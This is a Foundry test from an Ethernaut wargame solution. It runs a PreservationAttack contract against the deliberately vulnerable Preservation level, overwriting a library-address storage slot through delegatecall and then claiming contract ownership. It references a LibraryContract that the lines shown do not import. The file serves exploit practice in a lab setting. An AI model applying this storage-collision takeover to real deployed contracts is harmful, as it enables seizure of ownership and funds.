// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "@forge-std/Test.sol";
import {Utils} from "./utils/Utils.sol";

import {Preservation} from "../src/levels/Preservation.sol";
import {PreservationFactory} from "../src/levels/PreservationFactory.sol";
import {PreservationAttack} from "../src/attacks/PreservationAttack.sol";

import {Level} from "src/levels/base/Level.sol";
import {Ethernaut} from "src/Ethernaut.sol";

address constant DEPLOYER = 0x1804c8AB1F12E6bbf3894d4083f33e07309d1f38;

contract PreservationAttackTest is Test {
    Preservation private preservation;
    PreservationAttack private preservationAttack;

    function setUp() public {
        preservation = new Preservation(address(new LibraryContract()), address(new LibraryContract()));
        preservationAttack = new PreservationAttack(address(preservation));
    }

    function testAttack() public {
        preservationAttack.takeSlotZero();
        assertEq(address(preservation.timeZone1Library()), address(preservationAttack));

        // console.log("casted address -> uint256", uint256(uint160(DEPLOYER)));
        preservation.setFirstTime(uint256(uint160(DEPLOYER)));
        assertEq(preservation.owner(), DEPLOYER);
    }
}